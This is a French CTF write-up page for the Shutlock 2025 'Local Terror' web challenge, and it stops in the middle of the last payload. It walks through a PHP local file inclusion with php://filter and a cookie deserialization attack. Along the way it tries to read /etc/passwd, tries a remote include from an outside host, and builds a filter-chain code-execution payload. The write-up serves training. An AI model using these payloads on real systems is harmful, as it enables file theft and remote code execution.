@@ -1,0 +1,342 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="fr" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Local Terror &mdash; Documentation Kubow WU 1</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=a12a2fe1"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/translations.js?v=e6b791cb"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Recherche" href="../../search.html" />
+    <link rel="next" title="Old School Markus" href="oldschool.html" />
+    <link rel="prev" title="Ice Cream" href="icecream.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Kubow WU
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Rechercher docs" aria-label="Rechercher docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Liste des CTFs :</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2024/_index.html">Midnight Flag 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2025/_index.html">Midnight Flag 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../404ctf-2024/_index.html">404CTF 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../404ctf-2025/_index.html">404CTF 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../HTB-Apocalypse-2025/_index.html">HTB Apocalypse 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../FCSC-2025/_index.html">FCSC 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../DGSE-Root-Me-2025/_index.html">DGSE Root-Me 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Hackosint-2025/_index.html">Hackosint 2025</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="_index.html">Shutlock 2025</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="_index.html#story">Story</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="_index.html#web">Web</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="formavility.html">Form Avility</a></li>
+<li class="toctree-l3"><a class="reference internal" href="icecream.html">Ice Cream</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Local Terror</a></li>
+<li class="toctree-l3"><a class="reference internal" href="oldschool.html">Old School Markus</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="_index.html#osint">Osint</a></li>
+<li class="toctree-l2"><a class="reference internal" href="_index.html#forensic">Forensic</a></li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Kubow WU</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="_index.html">Shutlock 2025</a></li>
+      <li class="breadcrumb-item active">Local Terror</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/ctf/shutlock-2025/localterror.rst.txt" rel="nofollow"> Afficher la source de la page</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="local-terror">
+<h1>Local Terror<a class="headerlink" href="#local-terror" title="Lien vers cette rubrique"></a></h1>
+<p>On se rend sur /api/</p>
+<p>On a ensuite un formulaire qui retourne le message qu’on lui envoie + le contenu d’un fichier qui change selon la version.</p>
+<p>On a une local file inclusion dans le paramètre version</p>
+<p>Si on ajoute « .. » dans version, alors on obtient « HACKER DETECTED »</p>
+<p>Si on ajoute « %00 » on obtienr une erreur qui nous indique que la fonction utilisé est « file_get_content »</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">POST /api/ HTTP/1.1</span>
+<span class="go">Host: 57.128.112.118:14539</span>
+<span class="go">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="go">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="go">Accept-Language: en-US,en;q=0.5</span>
+<span class="go">Accept-Encoding: gzip, deflate, br</span>
+<span class="go">Referer: http://57.128.112.118:14539/api/</span>
+<span class="go">Content-Type: application/x-www-form-urlencoded</span>
+<span class="go">Content-Length: 90</span>
+<span class="go">Origin: http://57.128.112.118:14539</span>
+<span class="go">Connection: keep-alive</span>
+<span class="go">Upgrade-Insecure-Requests: 1</span>
+<span class="go">X-PwnFox-Color: red</span>
+<span class="go">Priority: u=0, i</span>
+
+<span class="go">userName=mon+nom&amp;inputText=texte&amp;language=php&amp;language=text&amp;version=index.php&amp;rendering=on</span>
+</pre></div>
+</div>
+<p>On obtient le code index.php :</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">    </span><span class="cp">&lt;?php</span>
+    <span class="c1">// Work done based on previous version: old/index-old-do-not-use-please.php. The last code was vulnerable and so must bot be used in any circumstances.</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$userName</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;userName&#39;</span><span class="p">]);</span>
+        <span class="nv">$language</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;language&#39;</span><span class="p">];</span>
+        <span class="nv">$version</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;version&#39;</span><span class="p">];</span>
+        <span class="nv">$rendering</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rendering&#39;</span><span class="p">];</span>
+        <span class="nv">$inputText</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$rendering</span> <span class="o">===</span> <span class="s1">&#39;on&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$language</span> <span class="o">===</span> <span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inputText&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inputText&#39;</span><span class="p">]);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$language</span> <span class="o">===</span> <span class="s2">&quot;php&quot;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;div class=&#39;output&#39;&gt;&quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;Erreur :&lt;/h2&gt;&quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Vous avez sélectionné l&#39;option &#39;PHP&#39;. Cette option est désactivée pour des raisons de sécurité.&lt;/p&gt;&quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
+            <span class="k">exit</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$version</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">&#39;HACKER DETECTÉ&#39;</span><span class="p">;</span>
+            <span class="k">exit</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$version</span><span class="p">,</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">){</span>
+            <span class="nv">$fileContent</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$version</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$fileContent</span> <span class="o">=</span> <span class="s1">&#39;HACKER DETECTÉ&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">echo</span> <span class="s2">&quot;&lt;div class=&#39;output&#39;&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;Soumis par : </span><span class="si">$userName</span><span class="s2">&lt;/h2&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;h3&gt;Votre Texte :&lt;/h3&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt; </span><span class="si">$inputText</span><span class="s2"> &lt;/p&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;h3&gt;Contenu du fichier :&lt;/h3&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt; </span><span class="si">$fileContent</span><span class="s2"> &lt;/p&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="cp">?&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+</pre></div>
+</div>
+<p>Avec ceci, on obtient le fichier index.php mais encodé en rot13 :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">userName=mon+nom&amp;inputText=texte&amp;language=php&amp;language=text&amp;version=php://filter/read=string.rot13/resource=index.php&amp;rendering=on</span>
+</pre></div>
+</div>
+<p>On peut donc utiliser les wrapper php</p>
+<p>On va déjà récupérer le fichier : old/index-old-do-not-use-please.php</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// Do not use this file anymore.</span>
+<span class="c1">// First of all it is not working well. You need to reload the page to see the output.</span>
+<span class="c1">// And it is vulnerable to attacks. It is not safe to use this file.</span>
+<span class="c1">// Please delete and tell the prod tean to not push this file to the server.</span>
+<span class="c1">// Thx, A.L</span>
+
+<span class="k">class</span> <span class="nc">Parser</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$debug</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$version</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$betterprint</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$version</span><span class="p">,</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$betterprint</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">debug</span> <span class="o">=</span> <span class="nv">$debug</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">version</span> <span class="o">=</span> <span class="nv">$version</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">betterprint</span> <span class="o">=</span> <span class="nv">$betterprint</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">evaluate</span><span class="p">(){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">debug</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">version</span> <span class="o">===</span> <span class="s1">&#39;v1.0&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">require_once</span><span class="p">(</span><span class="nv">$this</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">betterprint</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">version</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;parser&quot;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Parser</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inputText&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;version&#39;</span><span class="p">]))),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">),</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span>
+
+
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="x">&lt;html&gt;</span>
+<span class="x">&lt;head&gt;</span>
+<span class="x">    &lt;title&gt;Text Input and Output&lt;/title&gt;</span>
+<span class="x">    &lt;style&gt;</span>
+<span class="x">        .container {</span>
+<span class="x">            margin: 50px auto;</span>
+<span class="x">            width: 70%;</span>
+<span class="x">            text-align: center;</span>
+<span class="x">        }</span>
+<span class="x">        select, textarea, input[type=&quot;text&quot;], .output {</span>
+<span class="x">            width: 100%;</span>
+<span class="x">            padding: 10px;</span>
+<span class="x">            margin-top: 10px;</span>
+<span class="x">        }</span>
+<span class="x">        .select-container {</span>
+<span class="x">            display: flex;</span>
+<span class="x">            justify-content: space-between;</span>
+<span class="x">        }</span>
+<span class="x">        .select-container select {</span>
+<span class="x">            flex: 1;</span>
+<span class="x">            margin: 0 5px;</span>
+<span class="x">        }</span>
+<span class="x">    &lt;/style&gt;</span>
+<span class="x">&lt;/head&gt;</span>
+<span class="x">&lt;body&gt;</span>
+<span class="x">    &lt;div class=&quot;container&quot;&gt;</span>
+<span class="x">        &lt;h2&gt;Enter Your Text&lt;/h2&gt;</span>
+<span class="x">        &lt;form method=&quot;post&quot;&gt;</span>
+<span class="x">            &lt;textarea name=&quot;inputText&quot; rows=&quot;10&quot; id=&quot;input&quot;&gt;&lt;/textarea&gt;</span>
+<span class="x">            &lt;br&gt;</span>
+<span class="x">            &lt;div class=&quot;select-container&quot;&gt;</span>
+<span class="x">                &lt;select name=&quot;version&quot; id=&quot;version&quot;&gt;</span>
+<span class="x">                    &lt;option value=&quot;v0.5&quot;&gt;v0.5&lt;/option&gt;</span>
+<span class="x">                    &lt;option value=&quot;v0.1&quot;&gt;v0.1&lt;/option&gt;</span>
+<span class="x">                &lt;/select&gt;</span>
+<span class="x">            &lt;/div&gt;</span>
+<span class="x">            &lt;br&gt;</span>
+<span class="x">            &lt;button type=&quot;submit&quot; onclick=&quot;submitFormData()&quot;&gt;Submit&lt;/button&gt;</span>
+<span class="x">        &lt;/form&gt;</span>
+
+<span class="x">        </span><span class="cp">&lt;?php</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;parser&quot;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;parser&quot;</span><span class="p">])){</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;div class=&#39;output&#39;&gt;&quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;h3&gt;Your Text:&lt;/h3&gt;&quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt; &quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;parser&#39;</span><span class="p">]))</span><span class="o">-&gt;</span><span class="na">evaluate</span><span class="p">();</span>
+            <span class="k">echo</span> <span class="s2">&quot; &lt;/p&gt;&quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="cp">?&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+<span class="x">&lt;/p&gt;&lt;/div&gt;</span>
+</pre></div>
+</div>
+<p>On va donc modifier notre cookie pour qu’il soit unserialize et exploiter cette fonctionnalité.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">O:6:&quot;Parser&quot;:4:{s:4:&quot;text&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;debug&quot;;b:1;s:7:&quot;version&quot;;s:4:&quot;v1.0&quot;;s:11:&quot;betterprint&quot;;b:1;}</span>
+<span class="go">Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czoxMToiL2V0Yy9wYXNzd2QiO3M6NToiZGVidWciO2I6MTtzOjc6InZlcnNpb24iO3M6NDoidjEuMCI7czoxMToiYmV0dGVycHJpbnQiO2I6MTt9</span>
+<span class="go">require_once(): open_basedir restriction in effect. File(/etc/passwd) is not within the allowed path(s): (/var/www/html) in &lt;b&gt;/var/www/html/api/old/index-old-do-not-use-please.php</span>
+
+<span class="go">O:6:&quot;Parser&quot;:4:{s:4:&quot;text&quot;;s:34:&quot;https://ahvce.free.beeceptor.com/a&quot;;s:5:&quot;debug&quot;;b:1;s:7:&quot;version&quot;;s:4:&quot;v1.0&quot;;s:11:&quot;betterprint&quot;;b:1;}</span>
+<span class="go">Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czozNDoiaHR0cHM6Ly9haHZjZS5mcmVlLmJlZWNlcHRvci5jb20vYSI7czo1OiJkZWJ1ZyI7YjoxO3M6NzoidmVyc2lvbiI7czo0OiJ2MS4wIjtzOjExOiJiZXR0ZXJwcmludCI7YjoxO30%3D</span>
+<span class="go">Warning&lt;/b&gt;:  require_once(): https:// wrapper is disabled in the server configuration by allow_url_fopen=0 in &lt;b&gt;/var/www/html/api/old/index-old-do-not-use-please.php&lt;/b&gt; on line &lt;b&gt;24</span>
+</pre></div>
+</div>
+<p>On ne peut donc pas sortir de /var/www/html, et on ne peut pas inclure de fichier distant.</p>
+<p>Finalement on va utiliser ceci : <a class="reference external" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">python3 php_filter_chain_generator.py --chain &#39;&lt;?php phpinfo(); ?&gt;&#39;</span>
+<span class="go">[+] The following gadget chain will generate the following code : &lt;?php phpinfo(); ?&gt; (base64 value: PD9waHAgcGhwaW5mbygpOyA/Pg)</span>
+<span class="go">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span>
+
+<span class="go">O:6:&quot;Parser&quot;:4:{s:4:&quot;text&quot;;s:4130:&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CS